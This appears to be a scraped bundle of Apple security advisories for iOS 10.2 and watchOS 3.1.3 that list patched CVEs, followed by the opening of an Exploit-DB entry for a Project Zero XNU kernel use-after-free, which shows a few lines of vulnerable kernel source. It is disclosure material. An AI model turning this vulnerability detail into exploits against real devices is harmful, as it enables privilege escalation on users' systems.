=== Content from support.apple.com_20581d55_20250125_162523.html ===


* [Apple](https://www.apple.com/)
* + [Store](https://www.apple.com/us/shop/goto/store)
  + [Mac](https://www.apple.com/mac/)
  + [iPad](https://www.apple.com/ipad/)
  + [iPhone](https://www.apple.com/iphone/)
  + [Watch](https://www.apple.com/watch/)
  + [Vision](https://www.apple.com/apple-vision-pro/)
  + [AirPods](https://www.apple.com/airpods/)
  + [TV & Home](https://www.apple.com/tv-home/)
  + [Entertainment](https://www.apple.com/entertainment/)
  + [Accessories](https://www.apple.com/us/shop/goto/buy_accessories)
  + [Support](https://support.apple.com/?cid=gn-ols-home-hp-tab)
* 0+

# About the security content of iOS 10.2

This document describes the security content of iOS 10.2.

## About Apple security updates

For our customers' protection, Apple doesn't disclose, discuss, or confirm security issues until an investigation has occurred and patches or releases are available. Recent releases are listed on the [Apple security updates](https://support.apple.com/kb/HT201222) page.

For more information about security, see the [Apple Product Security](https://support.apple.com/kb/HT201220) page. You can encrypt communications with Apple using the [Apple Product Security PGP Key](https://support.apple.com/kb/HT201601).

Apple security documents reference vulnerabilities by [CVE-ID](http://cve.mitre.org/about/) when possible.

## iOS 10.2

Released December 12, 2016

**Accessibility**

Available for: iPhone 5 and later, iPad 4th generation and later, iPod touch 6th generation and later

Impact: A nearby user may be able to overhear spoken passwords

Description: A disclosure issue existed in the handling of passwords. This issue was addressed by disabling the speaking of passwords.

CVE-2016-7634: Davut Hari, Biren V. Soni, Cameron Lee

Entry updated January 10, 2017

**Accessibility**

Available for: iPhone 5 and later, iPad 4th generation and later, iPod touch 6th generation and later

Impact: A person with physical access to an iOS device may be able to access photos and contacts from the lock screen

Description: A lock screen issue allowed access to photos and contacts on a locked device. This issue was addressed by restricting options offered on a locked device.

CVE-2016-7664: Miguel Alvarado of iDeviceHelp

**Accounts**

Available for: iPhone 5 and later, iPad 4th generation and later, iPod touch 6th generation and later

Impact: An issue existed which did not reset the authorization settings on app uninstall

Description: This issue was addressed through improved sanitization.

CVE-2016-7651: Ju Zhu and Lilang Wu of Trend Micro

**Audio**

Available for: iPhone 5 and later, iPad 4th generation and later, iPod touch 6th generation and later

Impact: Processing a maliciously crafted file may lead to arbitrary code execution

Description: A memory corruption issue was addressed through improved input validation.

CVE-2016-7658: Haohao Kong of Keen Lab (@keen\_lab) of Tencent

CVE-2016-7659: Haohao Kong of Keen Lab (@keen\_lab) of Tencent

Entry added December 13, 2016

**Clipboard**

Available for: iPhone 5 and later, iPad 4th generation and later, iPod touch 6th generation and later

Impact: A local attacker may be able to access clipboard contents

Description: The clipboard contents were accessible before device unlock. This issue was addressed through improved state management.

CVE-2016-7765: CongRong (@Tr3jer)

Entry updated January 17, 2017

**CoreFoundation**

Available for: iPhone 5 and later, iPad 4th generation and later, iPod touch 6th generation and later

Impact: Processing malicious strings may lead to an unexpected application termination or arbitrary code execution

Description: A memory corruption issue existed in the processing of strings. This issue was addressed through improved bounds checking.

CVE-2016-7663: an anonymous researcher

Entry added December 13, 2016

**CoreGraphics**

Available for: iPhone 5 and later, iPad 4th generation and later, iPod touch 6th generation and later

Impact: Processing a maliciously crafted font file may lead to unexpected application termination

Description: A null pointer dereference was addressed through improved input validation.

CVE-2016-7627: TRAPMINE Inc. & Meysam Firouzi @R00tkitSMM

Entry added December 13, 2016

**CoreMedia External Displays**

Available for: iPhone 5 and later, iPad 4th generation and later, iPod touch 6th generation and later

Impact: A local application may be able to execute arbitrary code in the context of the mediaserver daemon

Description: A type confusion issue was addressed through improved memory handling.

CVE-2016-7655: Keen Lab working with Trend Micro’s Zero Day Initiative

Entry added December 13, 2016

**CoreMedia Playback**

Available for: iPhone 5 and later, iPad 4th generation and later, iPod touch 6th generation and later

Impact: Processing a maliciously crafted .mp4 file may lead to arbitrary code execution

Description: A memory corruption issue was addressed through improved memory handling.

CVE-2016-7588: dragonltx of Huawei 2012 Laboratories

Entry added December 13, 2016

**CoreText**

Available for: iPhone 5 and later, iPad 4th generation and later, iPod touch 6th generation and later

Impact: Processing a maliciously crafted font file may lead to arbitrary code execution

Description: Multiple memory corruption issues existed in the handling of font files. These issues were addressed through improved bounds checking.

CVE-2016-7595: riusksk(泉哥) of Tencent Security Platform Department

Entry added December 13, 2016

**CoreText**

Available for: iPhone 5 and later, iPad 4th generation and later, iPod touch 6th generation and later

Impact: Processing a maliciously crafted string may lead to a denial of service

Description: An issue when rendering overlapping ranges was addressed through improved validation.

CVE-2016-7667: Nasser Al-Hadhrami (@fast\_hack), Saif Al-Hinai (welcom\_there) of Digital Unit (dgunit.com)

Entry added December 15, 2016

**Disk Images**

Available for: iPhone 5 and later, iPad 4th generation and later, iPod touch 6th generation and later

Impact: An application may be able to execute arbitrary code with kernel privileges

Description: A memory corruption issue was addressed through improved input validation.

CVE-2016-7616: daybreaker@Minionz working with Trend Micro's Zero Day Initiative

Entry added December 13, 2016

**Find My iPhone**

Available for: iPhone 5 and later, iPad 4th generation and later, iPod touch 6th generation and later

Impact: An attacker with an unlocked device may be able to disable Find My iPhone

Description: A state management issue existed in the handling of authentication information. This issue was addressed through improved storage of account information.

CVE-2016-7638: an anonymous researcher, Sezer Sakiner

**FontParser**

Available for: iPhone 5 and later, iPad 4th generation and later, iPod touch 6th generation and later

Impact: Processing a maliciously crafted font file may lead to arbitrary code execution

Description: Multiple memory corruption issues existed in the handling of font files. These issues were addressed through improved bounds checking.

CVE-2016-4691: riusksk(泉哥) of Tencent Security Platform Department

Entry added December 13, 2016

**Graphics Driver**

Available for: iPhone 5 and later, iPad 4th generation and later, iPod touch 6th generation and later

Impact: Watching a maliciously crafted video may lead to a denial of service

Description: A denial of service issue existed in the handling of video. This issue was addressed through improved input validation.

CVE-2016-7665: Moataz El Gaml of Schlumberger, Daniel Schurter of watson.ch and Marc Ruef of scip AG

Entry updated December 15, 2016

**ICU**

Available for: iPhone 5 and later, iPad 4th generation and later, iPod touch 6th generation and later

Impact: Processing maliciously crafted web content may lead to arbitrary code execution

Description: A memory corruption issue was addressed through improved memory handling.

CVE-2016-7594: André Bargull

Entry added December 13, 2016

**Image Capture**

Available for: iPhone 5 and later, iPad 4th generation and later, iPod touch 6th generation and later

Impact: A malicious HID device may be able to cause arbitrary code execution

Description: A validation issue existed in the handling of USB image devices. This issue was addressed through improved input validation.

CVE-2016-4690: Andy Davis of NCC Group

**ImageIO**

Available for: iPhone 5 and later, iPad 4th generation and later, iPod touch 6th generation and later

Impact: A remote attacker may be able to leak memory

Description: An out-of-bounds read was addressed through improved bounds checking.

CVE-2016-7643: Yangkang (@dnpushme) of Qihoo360 Qex Team

Entry added December 13, 2016

**IOHIDFamily**

Available for: iPhone 5 and later, iPad 4th generation and later, iPod touch 6th generation and later

Impact: A local application with system privileges may be able to execute arbitrary code with kernel privileges

Description: A use after free issue was addressed through improved memory management.

CVE-2016-7591: daybreaker of Minionz

Entry added December 13, 2016

**IOKit**

Available for: iPhone 5 and later, iPad 4th generation and later, iPod touch 6th generation and later

Impact: An application may be able to read kernel memory

Description: A memory corruption issue was addressed through improved input validation.

CVE-2016-7657: Keen Lab working with Trend Micro’s Zero Day Initiative

Entry added December 13, 2016

**IOKit**

Available for: iPhone 5 and later, iPad 4th generation and later, iPod touch 6th generation and later

Impact: A local user may be able to determine kernel memory layout

Description: A shared memory issue was addressed through improved memory handling.

CVE-2016-7714: Qidan He (@flanker\_hqd) from KeenLab working with Trend Micro's Zero Day Initiative

Entry added January 25, 2017

**JavaScriptCore**

Available for: iPhone 5 and later, iPad 4th generation and later, iPod touch 6th generation and later

Impact: A script executing in a JavaScript sandbox may be able to access state outside that sandbox

Description: A validation issue existed in processing JavaScript. This issue was addressed through improved validation.

CVE-2016-4695: Mark S. Miller of Google

Entry added August 16, 2017

**Kernel**

Available for: iPhone 5 and later, iPad 4th generation and later, iPod touch 6th generation and later

Impact: An application may be able to execute arbitrary code with kernel privileges

Description: Multiple memory corruption issues were addressed through improved input validation.

CVE-2016-7606: @cocoahuke, Chen Qin of Topsec Alpha Team (topsec.com)

CVE-2016-7612: Ian Beer of Google Project Zero

Entry added December 13, 2016

**Kernel**

Available for: iPhone 5 and later, iPad 4th generation and later, iPod touch 6th generation and later

Impact: An application may be able to read kernel memory

Description: An insufficient initialization issue was addressed by properly initializing memory returned to user space.

CVE-2016-7607: Brandon Azad

Entry added December 13, 2016

**Kernel**

Available for: iPhone 5 and later, iPad 4th generation and later, iPod touch 6th generation and later

Impact: A local user may be able to cause a system denial of service

Description: A denial of service issue was addressed through improved memory handling.

CVE-2016-7615: The UK's National Cyber Security Centre (NCSC)

Entry added December 13, 2016

**Kernel**

Available for: iPhone 5 and later, iPad 4th generation and later, iPod touch 6th generation and later

Impact: A local user may be able to cause an unexpected system termination or arbitrary code execution in the kernel

Description: A use after free issue was addressed through improved memory management.

CVE-2016-7621: Ian Beer of Google Project Zero

Entry added December 13, 2016

**Kernel**

Available for: iPhone 5 and later, iPad 4th generation and later, iPod touch 6th generation and later

Impact: A local user may be able to gain root privileges

Description: A memory corruption issue was addressed through improved input validation.

CVE-2016-7637: Ian Beer of Google Project Zero

Entry added December 13, 2016

**Kernel**

Available for: iPhone 5 and later, iPad 4th generation and later, iPod touch 6th generation and later

Impact: A local application with system privileges may be able to execute arbitrary code with kernel privileges

Description: A use after free issue was addressed through improved memory management.

CVE-2016-7644: Ian Beer of Google Project Zero

Entry added December 13, 2016

**Kernel**

Available for: iPhone 5 and later, iPad 4th generation and later, iPod touch 6th generation and later

Impact: An application may be able to cause a denial of service

Description: A denial of service issue was addressed through improved memory handling.

CVE-2016-7647: Lufeng Li of Qihoo 360 Vulcan Team

Entry added May 17, 2017

**Kernel**

Available for: iPhone 5 and later, iPad 4th generation and later, iPod touch 6th generation and later

Impact: A malicious application may gain access to a device's MAC address

Description: An access issue was addressed through additional sandbox restrictions on third party applications.

CVE-2016-7766: Jun Yang(杨君) of Tencent's WeiXin Group

Entry added May 31, 2017

**libarchive**

Available for: iPhone 5 and later, iPad 4th generation and later, iPod touch 6th generation and later

Impact: A local attacker may be able to overwrite existing files

Description: A validation issue existed in the handling of symlinks. This issue was addressed through improved validation of symlinks.

CVE-2016-7619: an anonymous researcher

Entry added December 13, 2016

**Local Authentication**

Available for: iPhone 5 and later, iPad 4th generation and later, iPod touch 6th generation and later

Impact: The device may not lock the screen after the idle timeout

Description: A logic issue existed in the handling of the idle timer when the Touch ID prompt is shown. This issue was addressed through improved handling of the idle timer.

CVE-2016-7601: an anonymous researcher

**Mail**

Available for: iPhone 5 and later, iPad 4th generation and later, iPod touch 6th generation and later

Impact: An email signed with a revoked certificate may appear valid

Description: S/MIME policy failed to check if a certificate was valid. This issue was addressed by notifying a user if an email was signed with a revoked certificate.

CVE-2016-4689: an anonymous researcher

**Media Player**

Available for: iPhone 5 and later, iPad 4th generation and later, iPod touch 6th generation and later

Impact: A user may be able to view photos and contacts from the lockscreen

Description: A validation issue existed in the handling of media selection. This issue was addressed through improved validation.

CVE-2016-7653

**Power Management**

Available for: iPhone 5 and later, iPad 4th generation and later, iPod touch 6th generation and later

Impact: A local user may be able to gain root privileges

Description: An issue in mach port name references was addressed through improved validation.

CVE-2016-7661: Ian Beer of Google Project Zero

Entry added December 13, 2016

**Profiles**

Available for: iPhone 5 and later, iPad 4th generation and later, iPod touch 6th generation and later

Impact: Opening a maliciously crafted certificate may lead to arbitrary code execution

Description: A memory corruption issue existed in the handling of certificate profiles. This issue was addressed through improved input validation.

CVE-2016-7626: Maksymilian Arciemowicz (cxsecurity.com)

**Safari Reader**

Available for: iPhone 5 and later, iPad 4th generation and later, iPod touch 6th generation and later

Impact: Enabling the Safari Reader feature on a maliciously crafted webpage may lead to universal cross site scripting

Description: Multiple validation issues were addressed through improved input sanitization.

CVE-2016-7650: Erling Ellingsen

Entry added December 13, 2016

**Security**

Available for: iPhone 5 and later, iPad 4th generation and later, iPod touch 6th generation and later

Impact: An attacker may be able to exploit weaknesses in the 3DES cryptographic algorithm

Description: 3DES was removed as a default cipher.

CVE-2016-4693: Gaëtan Leurent and Karthikeyan Bhargavan from INRIA Paris

Entry added December 13, 2016

**Security**

Available for: iPhone 5 and later, iPad 4th generation and later, iPod touch 6th generation and later

Impact: An attacker in a privileged network position may be able to cause a denial of service

Description: A validation issue existed in the handling of OCSP responder URLs. This issue was addressed by verifying OCSP revocation status after CA validation and limiting the number of OCSP requests per certificate.

CVE-2016-7636: Maksymilian Arciemowicz (cxsecurity.com)

Entry added December 13, 2016

**Security**

Available for: iPhone 5 and later, iPad 4th generation and later, iPod touch 6th generation and later

Impact: Certificates may be unexpectedly evaluated as trusted

Description: A certificate evaluation issue existed in certificate validation. This issue was addressed through additional validation of certificates.

CVE-2016-7662: Apple

Entry added December 13, 2016

**SpringBoard**

Available for: iPhone 5 and later, iPad 4th generation and later, iPod touch 6th generation and later

Impact: A person with physical access to an iOS device may be able to unlock the device

Description: In some cases, a counter issue existed in the handling of passcode attempts when resetting the passcode. This was addressed through improved state management.

CVE-2016-4781: an anonymous researcher

**SpringBoard**

Available for: iPhone 5 and later, iPad 4th generation and later, iPod touch 6th generation and later

Impact: A person with physical access to an iOS device may be able to keep the device unlocked

Description: A cleanup issue existed in the handling of Handoff with Siri. This was addressed through improved state management.

CVE-2016-7597: an anonymous researcher

**syslog**

Available for: iPhone 5 and later, iPad 4th generation and later, iPod touch 6th generation and later

Impact: A local user may be able to gain root privileges

Description: An issue in mach port name references was addressed through improved validation.

CVE-2016-7660: Ian Beer of Google Project Zero

Entry added December 13, 2016

**WebKit**

Available for: iPhone 5 and later, iPad 4th generation and later, iPod touch 6th generation and later

Impact: Processing maliciously crafted web content may lead to arbitrary code execution

Description: Multiple memory corruption issues were addressed through improved memory handling.

CVE-2016-4692: Apple

CVE-2016-7635: Apple

CVE-2016-7652: Apple

Entry added December 13, 2016

**WebKit**

Available for: iPhone 5 and later, iPad 4th generation and later, iPod touch 6th generation and later

Impact: Processing maliciously crafted web content may result in the disclosure of process memory

Description: A memory corruption issue was addressed through improved input validation.

CVE-2016-4743: Alan Cutter

Entry added December 13, 2016

**WebKit**

Available for: iPhone 5 and later, iPad 4th generation and later, iPod touch 6th generation and later

Impact: Processing maliciously crafted web content may result in the disclosure of user information

Description: A validation issue was addressed through improved state management.

CVE-2016-7586: Boris Zbarsky

Entry added December 13, 2016

**WebKit**

Available for: iPhone 5 and later, iPad 4th generation and later, iPod touch 6th generation and later

Impact: Processing maliciously crafted web content may lead to arbitrary code execution

Description: Multiple memory corruption issues were addressed through improved state management.

CVE-2016-7587: Adam Klein

CVE-2016-7610: Zheng Huang of the Baidu Security Lab working with Trend Micro's Zero Day Initiative

CVE-2016-7611: an anonymous researcher working with Trend Micro's Zero Day Initiative

CVE-2016-7639: Tongbo Luo of Palo Alto Networks

CVE-2016-7640: Kai Kang of Tencent's Xuanwu Lab (tencent.com)

CVE-2016-7641: Kai Kang of Tencent's Xuanwu Lab (tencent.com)

CVE-2016-7642: Tongbo Luo of Palo Alto Networks

CVE-2016-7645: Kai Kang of Tencent's Xuanwu Lab (tencent.com)

CVE-2016-7646: Kai Kang of Tencent's Xuanwu Lab (tencent.com)

CVE-2016-7648: Kai Kang of Tencent's Xuanwu Lab (tencent.com)

CVE-2016-7649: Kai Kang of Tencent's Xuanwu Lab (tencent.com)

CVE-2016-7654: Keen Lab working with Trend Micro’s Zero Day Initiative

Entry added December 13, 2016

**WebKit**

Available for: iPhone 5 and later, iPad 4th generation and later, iPod touch 6th generation and later

Impact: Processing maliciously crafted web content may lead to arbitrary code execution

Description: A memory corruption issue was addressed through improved state management.

CVE-2016-7589: Apple

CVE-2016-7656: Keen Lab working with Trend Micro’s Zero Day Initiative

Entry added December 13, 2016

**WebKit**

Available for: iPhone 5 and later, iPad 4th generation and later, iPod touch 6th generation and later

Impact: Processing maliciously crafted web content may compromise user information

Description: An issue existed in handling of JavaScript prompts. This was addressed through improved state management.

CVE-2016-7592: xisigr of Tencent's Xuanwu Lab (tencent.com)

Entry added December 13, 2016

**WebKit**

Available for: iPhone 5 and later, iPad 4th generation and later, iPod touch 6th generation and later

Impact: Processing maliciously crafted web content may result in the disclosure of process memory

Description: An uninitialized memory access issue was addressed through improved memory initialization.

CVE-2016-7598: Samuel Groß

Entry added December 13, 2016

**WebKit**

Available for: iPhone 5 and later, iPad 4th generation and later, iPod touch 6th generation and later

Impact: Processing maliciously crafted web content may result in the disclosure of user information

Description: An issue existed in the handling of HTTP redirects. This issue was addressed through improved cross origin validation.

CVE-2016-7599: Muneaki Nishimura (nishimunea) of Recruit Technologies Co., Ltd.

Entry added December 13, 2016

**WebKit**

Available for: iPhone 5 and later, iPad 4th generation and later, iPod touch 6th generation and later

Impact: Visiting a maliciously crafted website may compromise user information

Description: An issue existed in the handling of blob URLs. This issue was addressed through improved URL handling.

CVE-2016-7623: xisigr of Tencent's Xuanwu Lab (tencent.com)

Entry added December 13, 2016

**WebKit**

Available for: iPhone 5 and later, iPad 4th generation and later, iPod touch 6th generation and later

Impact: Visiting a maliciously crafted webpage may lead to an unexpected application termination or arbitrary code execution

Description: A memory corruption issue was addressed through improved state management.

CVE-2016-7632: Jeonghoon Shin

Entry added December 13, 2016

**WebKit**

Available for: iPhone 5 and later, iPad 4th generation and later, iPod touch 6th generation and later

Impact: Processing maliciously crafted web content may lead to cross site scripting

Description: An issue existed in displaying documents in Safari. This issue was addressed through improved input validation.

CVE-2016-7762: YongShao (Zhiyong Feng from JDSEC 1aq.com‍)

Entry added January 24, 2017

**WebSheet**

Available for: iPhone 5 and later, iPad 4th generation and later, iPod touch 6th generation and later

Impact: A sandboxed process may be able to circumvent sandbox restrictions

Description: A sandbox escape issue was addressed through additional restrictions.

CVE-2016-7630: Marco Grassi (@marcograss) of KeenLab (@keen\_lab) Tencent working with Trend Micro's Zero Day Initiative

Entry added January 25, 2017

Information about products not manufactured by Apple, or independent websites not controlled or tested by Apple, is provided without recommendation or endorsement. Apple assumes no responsibility with regard to the selection, performance, or use of third-party websites or products. Apple makes no representations regarding third-party website accuracy or reliability. [Contact the vendor](https://support.apple.com/103190) for additional information.

Published Date: November 03, 2023

Helpful?

Yes

No

Character limit:
250

Maximum character limit is 250.

Please don’t include any personal information in your comment.
Submit

Thanks for your feedback.

## Apple Footer

[
Apple](https://www.apple.com)

1. [Support](https://support.apple.com)
2. About the security content of iOS 10.2

[United States](https://support.apple.com/en-us/103636/localeselector "Choose your country or region")

Copyright © 2025 Apple Inc. All rights reserved.
 [Privacy Policy](https://www.apple.com/legal/privacy/en-ww/) [Terms of Use](https://www.apple.com/legal/internet-services/terms/site.html) [Sales and Refunds](https://www.apple.com/shop/goto/help/sales_refunds) [Site Map](https://www.apple.com/sitemap/)



=== Content from support.apple.com_d5761964_20250125_162525.html ===


* [Apple](https://www.apple.com/)
* + [Store](https://www.apple.com/us/shop/goto/store)
  + [Mac](https://www.apple.com/mac/)
  + [iPad](https://www.apple.com/ipad/)
  + [iPhone](https://www.apple.com/iphone/)
  + [Watch](https://www.apple.com/watch/)
  + [Vision](https://www.apple.com/apple-vision-pro/)
  + [AirPods](https://www.apple.com/airpods/)
  + [TV & Home](https://www.apple.com/tv-home/)
  + [Entertainment](https://www.apple.com/entertainment/)
  + [Accessories](https://www.apple.com/us/shop/goto/buy_accessories)
  + [Support](https://support.apple.com/?cid=gn-ols-home-hp-tab)
* 0+

# About the security content of watchOS 3.1.3

This document describes the security content of watchOS 3.1.3.

## About Apple security updates

For our customers' protection, Apple doesn't disclose, discuss, or confirm security issues until an investigation has occurred and patches or releases are available. Recent releases are listed on the [Apple security updates](https://support.apple.com/kb/HT201222) page.

For more information about security, see the [Apple Product Security](https://support.apple.com/kb/HT201220) page. You can encrypt communications with Apple using the [Apple Product Security PGP Key](https://support.apple.com/kb/HT201601).

Apple security documents reference vulnerabilities by [CVE-ID](http://cve.mitre.org/about/) when possible.

## watchOS 3.1.3

Released January 23, 2017

**Accounts**

Available for: All Apple Watch models

Impact: Uninstalling an app did not reset the authorization settings

Description: An issue existed which did not reset the authorization settings on app uninstall. This issue was addressed through improved sanitization.

CVE-2016-7651: Ju Zhu and Lilang Wu of Trend Micro

**APNs Server**

Available for: All Apple Watch models

Impact: An attacker in a privileged network position can track a user's activity

Description: A client certificate was sent in plaintext. This issue was addressed through improved certificate handling.

CVE-2017-2383: Matthias Wachs and Quirin Scheitle of Technical University Munich (TUM)

Entry added March 28, 2017

**Audio**

Available for: All Apple Watch models

Impact: Processing a maliciously crafted file may lead to arbitrary code execution

Description: A memory corruption issue was addressed through improved input validation.

CVE-2016-7658: Haohao Kong of Keen Lab (@keen\_lab) of Tencent

CVE-2016-7659: Haohao Kong of Keen Lab (@keen\_lab) of Tencent

**CoreFoundation**

Available for: All Apple Watch models

Impact: Processing maliciously crafted strings may lead to an unexpected application termination or arbitrary code execution

Description: A memory corruption issue existed in the processing of strings. This issue was addressed through improved bounds checking.

CVE-2016-7663: an anonymous researcher

**CoreGraphics**

Available for: All Apple Watch models

Impact: Processing a maliciously crafted font file may lead to unexpected application termination

Description: A null pointer dereference was addressed through improved input validation.

CVE-2016-7627: TRAPMINE Inc. & Meysam Firouzi @R00tkitSMM

**CoreMedia Playback**

Available for: All Apple Watch models

Impact: Processing a maliciously crafted .mp4 file may lead to arbitrary code execution

Description: A memory corruption issue was addressed through improved memory handling.

CVE-2016-7588: dragonltx of Huawei 2012 Laboratories

**CoreText**

Available for: All Apple Watch models

Impact: Processing a maliciously crafted font file may lead to arbitrary code execution

Description: Multiple memory corruption issues existed in the handling of font files. These issues were addressed through improved bounds checking.

CVE-2016-7595: riusksk(泉哥) of Tencent Security Platform Department

**Disk Images**

Available for: All Apple Watch models

Impact: An application may be able to execute arbitrary code with kernel privileges

Description: A memory corruption issue was addressed through improved input validation.

CVE-2016-7616: daybreaker@Minionz working with Trend Micro's Zero Day Initiative

**FontParser**

Available for: All Apple Watch models

Impact: Processing a maliciously crafted font file may lead to arbitrary code execution

Description: Multiple memory corruption issues existed in the handling of font files. These issues were addressed through improved bounds checking.

CVE-2016-4691: riusksk(泉哥) of Tencent Security Platform Department

**FontParser**

Available for: All Apple Watch models

Impact: Processing a maliciously crafted font file may lead to arbitrary code execution

Description: A buffer overflow existed in the handling of font files. This issue was addressed through improved bounds checking.

CVE-2016-4688: Simon Huang of Alipay company, thelongestusernameofall@gmail.com

**ICU**

Available for: All Apple Watch models

Impact: Processing maliciously crafted web content may lead to arbitrary code execution

Description: A memory corruption issue was addressed through improved memory handling.

CVE-2016-7594: André Bargull

**ImageIO**

Available for: All Apple Watch models

Impact: A remote attacker may be able to leak memory

Description: An out-of-bounds read was addressed through improved bounds checking.

CVE-2016-7643: Yangkang (@dnpushme) of Qihoo360 Qex Team

**IOHIDFamily**

Available for: All Apple Watch models

Impact: A local application with system privileges may be able to execute arbitrary code with kernel privileges

Description: A use after free issue was addressed through improved memory management.

CVE-2016-7591: daybreaker of Minionz

**IOKit**

Available for: All Apple Watch models

Impact: An application may be able to read kernel memory

Description: A memory corruption issue was addressed through improved input validation.

CVE-2016-7657: Keen Lab working with Trend Micro's Zero Day Initiative

**IOKit**

Available for: All Apple Watch models

Impact: A local user may be able to determine kernel memory layout

Description: A shared memory issue was addressed through improved memory handling.

CVE-2016-7714: Qidan He (@flanker\_hqd) from KeenLab working with Trend Micro's Zero Day Initiative

Entry added January 25, 2017

**Kernel**

Available for: All Apple Watch models

Impact: An application may be able to execute arbitrary code with kernel privileges

Description: Multiple memory corruption issues were addressed through improved input validation.

CVE-2016-7606: Chen Qin of Topsec Alpha Team (topsec.com), @cocoahuke

CVE-2016-7612: Ian Beer of Google Project Zero

**Kernel**

Available for: All Apple Watch models

Impact: An application may be able to read kernel memory

Description: An insufficient initialization issue was addressed by properly initializing memory returned to user space.

CVE-2016-7607: Brandon Azad

**Kernel**

Available for: All Apple Watch models

Impact: A local user may be able to cause a system denial of service

Description: A denial of service issue was addressed through improved memory handling.

CVE-2016-7615: The UK's National Cyber Security Centre (NCSC)

**Kernel**

Available for: All Apple Watch models

Impact: A local user may be able to cause an unexpected system termination or arbitrary code execution in the kernel

Description: A use after free issue was addressed through improved memory management.

CVE-2016-7621: Ian Beer of Google Project Zero

**Kernel**

Available for: All Apple Watch models

Impact: A local user may be able to gain root privileges

Description: A memory corruption issue was addressed through improved input validation.

CVE-2016-7637: Ian Beer of Google Project Zero

**Kernel**

Available for: All Apple Watch models

Impact: A local application with system privileges may be able to execute arbitrary code with kernel privileges

Description: A use after free issue was addressed through improved memory management.

CVE-2016-7644: Ian Beer of Google Project Zero

**Kernel**

Available for: All Apple Watch models

Impact: An application may be able to cause a denial of service

Description: A denial of service issue was addressed through improved memory handling.

CVE-2016-7647: Lufeng Li of Qihoo 360 Vulcan Team

Entry added May 17, 2017

**Kernel**

Available for: All Apple Watch models

Impact: An application may be able to execute arbitrary code with kernel privileges

Description: A buffer overflow issue was addressed through improved memory handling.

CVE-2017-2370: Ian Beer of Google Project Zero

**Kernel**

Available for: All Apple Watch models

Impact: An application may be able to execute arbitrary code with kernel privileges

Description: A use after free issue was addressed through improved memory management.

CVE-2017-2360: Ian Beer of Google Project Zero

**libarchive**

Available for: All Apple Watch models

Impact: A local attacker may be able to overwrite existing files

Description: A validation issue existed in the handling of symlinks. This issue was addressed through improved validation of symlinks.

CVE-2016-7619: an anonymous researcher

**libarchive**

Available for: All Apple Watch models

Impact: Unpacking a maliciously crafted archive may lead to arbitrary code execution

Description: A buffer overflow issue was addressed through improved memory handling.

CVE-2016-8687: Agostino Sarubbo of Gentoo

**Profiles**

Available for: All Apple Watch models

Impact: Opening a maliciously crafted certificate may lead to arbitrary code execution

Description: A memory corruption issue existed in the handling of certificate profiles. This issue was addressed through improved input validation.

CVE-2016-7626: Maksymilian Arciemowicz (cxsecurity.com)

**Security**

Available for: All Apple Watch models

Impact: An attacker may be able to exploit weaknesses in the 3DES cryptographic algorithm

Description: 3DES was removed as a default cipher.

CVE-2016-4693: Gaëtan Leurent and Karthikeyan Bhargavan from INRIA Paris

**Security**

Available for: All Apple Watch models

Impact: An attacker in a privileged network position may be able to cause a denial of service

Description: A validation issue existed in the handling of OCSP responder URLs. This issue was addressed by verifying OCSP revocation status after CA validation and limiting the number of OCSP requests per certificate.

CVE-2016-7636: Maksymilian Arciemowicz (cxsecurity.com)

**Security**

Available for: All Apple Watch models

Impact: Certificates may be unexpectedly evaluated as trusted

Description: A certificate evaluation issue existed in certificate validation. This issue was addressed through additional validation of certificates.

CVE-2016-7662: Apple

**syslog**

Available for: All Apple Watch models

Impact: A local user may be able to gain root privileges

Description: An issue in mach port name references was addressed through improved validation.

CVE-2016-7660: Ian Beer of Google Project Zero

**Unlock with iPhone**

Available for: All Apple Watch models

Impact: Apple Watch may unlock when off the user’s wrist

Description: A logic issue was addressed through improved state management.

CVE-2017-2352: Ashley Fernandez of raptAware Pty Ltd

Entry updated January 25, 2017

**WebKit**

Available for: All Apple Watch models

Impact: Processing maliciously crafted web content may lead to arbitrary code execution

Description: A memory corruption issue was addressed through improved state management.

CVE-2016-7589: Apple

**WebKit**

Available for: All Apple Watch models

Impact: Processing maliciously crafted web content may exfiltrate data cross-origin

Description: Multiple validation issues existed in the handling of page loading. This issue was addressed through improved logic.

CVE-2017-2363: lokihardt of Google Project Zero

Information about products not manufactured by Apple, or independent websites not controlled or tested by Apple, is provided without recommendation or endorsement. Apple assumes no responsibility with regard to the selection, performance, or use of third-party websites or products. Apple makes no representations regarding third-party website accuracy or reliability. [Contact the vendor](https://support.apple.com/103190) for additional information.

Published Date: November 03, 2023

Helpful?

Yes

No

Character limit:
250

Maximum character limit is 250.

Please don’t include any personal information in your comment.
Submit

Thanks for your feedback.

## Apple Footer

[
Apple](https://www.apple.com)

1. [Support](https://support.apple.com)
2. About the security content of watchOS 3.1.3

[United States](https://support.apple.com/en-us/103531/localeselector "Choose your country or region")

Copyright © 2025 Apple Inc. All rights reserved.
 [Privacy Policy](https://www.apple.com/legal/privacy/en-ww/) [Terms of Use](https://www.apple.com/legal/internet-services/terms/site.html) [Sales and Refunds](https://www.apple.com/shop/goto/help/sales_refunds) [Site Map](https://www.apple.com/sitemap/)



=== Content from www.exploit-db.com_8d57d44d_20250125_162527.html ===

[![Exploit Database](/images/spider-white.png)](/)
[Exploit Database](/)

* [Exploits](/)
* [GHDB](/google-hacking-database)
* [Papers](/papers)
* [Shellcodes](/shellcodes)

---

* [Search EDB](/search)
* [SearchSploit Manual](/searchsploit)
* [Submissions](/submit)

---

* [Online Training](https://www.offsec.com/)

[![Exploit Database](/images/edb-logo.png)](/)

* [Stats](/exploit-database-statistics)
* [About Us](/)

  [About Exploit-DB](/about-exploit-db)
  [Exploit-DB History](/history)
  [FAQ](/faq)
* Search

# Apple macOS 10.12 16A323 XNU Kernel / iOS 10.1.1 - 'set\_dp\_control\_port' Lack of Locking Use-After-Free

#### EDB-ID:

###### 40931

#### CVE:

###### [2016-7661](https://nvd.nist.gov/vuln/detail/CVE-2016-7661) [2016-7644](https://nvd.nist.gov/vuln/detail/CVE-2016-7644) [2016-7637](https://nvd.nist.gov/vuln/detail/CVE-2016-7637)

---

**EDB Verified:**

#### Author:

###### [Google Security Research](/?author=7725)

#### Type:

###### [local](/?type=local)

---

#### Platform:

###### [Multiple](/?platform=multiple)

#### Date:

###### 2016-12-16

---

**Vulnerable App:**

```
Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=965

set_dp_control_port is a MIG method on the host_priv_port so this bug is a root->kernel escalation.

  kern_return_t
  set_dp_control_port(
    host_priv_t host_priv,
    ipc_port_t  control_port)
  {
          if (host_priv == HOST_PRIV_NULL)
                  return (KERN_INVALID_HOST);

    if (IP_VALID(dynamic_pager_control_port))
